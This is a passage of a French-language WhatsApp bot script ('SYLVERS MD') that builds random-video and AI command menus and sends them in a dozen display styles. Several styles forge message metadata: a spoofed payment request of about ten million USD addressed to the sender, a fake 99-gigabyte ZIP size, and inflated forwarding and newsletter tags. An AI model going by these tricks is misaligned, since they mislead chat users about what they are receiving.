                        quoted: m
                    })
                } else if (typemenu === 's2') {
                    Kev.sendMessage(m.chat, {
                        text: kevmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 's3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kevmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 's6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kevmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 's7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kevmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 's8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kevmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 's9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
caption: kevmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: global.xchannel.jid,
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 's10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kevmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 's11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kevmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 's12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU🧾",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT-MENU",
"title":"cliquez pour selectionner",
"description":"Afficher la liste de toutes les commandes",
"id":"${prefix}tout-menu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu-randomvideo': {
let kevmenu_oh = `
╭─✣「 *SYLVERS MD* 」✣─╮
│➠ *Hey 🍁*
│➠ *${m.pushName}* 
│➠ *${Kevinoutimewisher}* 
╰──────✣ ${readmore}
╭──✣「 *GUIDE* 」✣────╮
│➠ *🅟 = pour le proprio * 
│➠ *🅡 = Pour les randoms*
│➠ *🅑 =pour les boss*
╰─────────────────╯
╭──✣「 *Random Video* 」✣╮
│${setv} ╭───────────╮
│${setv} │${prefix}tiktokgirl 🅡
│${setv} │${prefix}tiktoknukthy 🅡
│${setv} │${prefix}tiktokkayes 🅡
│${setv} │${prefix}tiktokpanrika 🅡
│${setv} │${prefix}tiktoknotnot 🅡
│${setv} │${prefix}tiktokghea 🅡
│${setv} │${prefix}tiktoksantuy 🅡
│${setv} │${prefix}tiktokbocil 🅡
│${setv} ╰────────────╯
╰───────────────────╯`
if (typemenu === 's1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's2') {
                    Kev.sendMessage(m.chat, {
                        text: kevmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 's3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kevmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 's6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kevmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 's7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kevmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 's8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kevmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 's9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
caption: kevmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: global.xchannel.jid,
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 's10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kevmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 's11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kevmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 's12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU🧾",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT-MENU",
"title":"cliquez pour selectionner",
"description":"Afficher la liste de toutes les commandes",
"id":"${prefix}tout-menu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'ai-menu': {
let kevmenu_oh = `
╭─✣「 *SYLVERS MD* 」✣─╮
│➠ *Hey 🍁*
│➠ *${m.pushName}* 
│➠ *${Kevinoutimewisher}* 
╰──────✣ ${readmore}
╭──✣「 *GUIDE* 」✣───╮
│➠ *🅟 = pour le proprio * 
│➠ *🅡 = Pour les randoms*
│➠ *🅑 =pour les boss*
╰────────────────╯
╭──✣「 *OpenAI* 」✣────╮
│${setv} ╭───────────╮
│${setv} │${prefix}blackboxai 🅡
│${setv} │${prefix}travel-assistant 🅡
│${setv} │${prefix}guru-ai 🅡
│${setv} │${prefix}emi-ai 🅡
│${setv} │${prefix}claude-ai 🅡
│${setv} │${prefix}hercai-cartoon 🅡
│${setv} │${prefix}hercai-animefy 🅡
│${setv} │${prefix}hercai-lexica 🅡
│${setv} │${prefix}hercai-prodia 🅡
│${setv} │${prefix}hercai-simurg 🅡
│${setv} │${prefix}hercai-raava 🅡
│${setv} │${prefix}hercai-shonin 🅡
│${setv} │${prefix}realistic 🅡
│${setv} │${prefix}3dmodel 🅡
│${setv} │${prefix}photoleap 🅡
│${setv} │${prefix}openai 🅡
│${setv} │${prefix}dalle 🅡
│${setv} │${prefix}ai 🅡
│${setv} │${prefix}remini 🅡
│${setv} ╰────────────╯
╰───────────────────╯`
if (typemenu === 's1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's2') {
                    Kev.sendMessage(m.chat, {
                        text: kevmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 's3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kevmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 's6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kevmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 's7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kevmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 's8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kevmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 's9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
caption: kevmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: global.xchannel.jid,
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 's10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kevmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 's11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kevmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
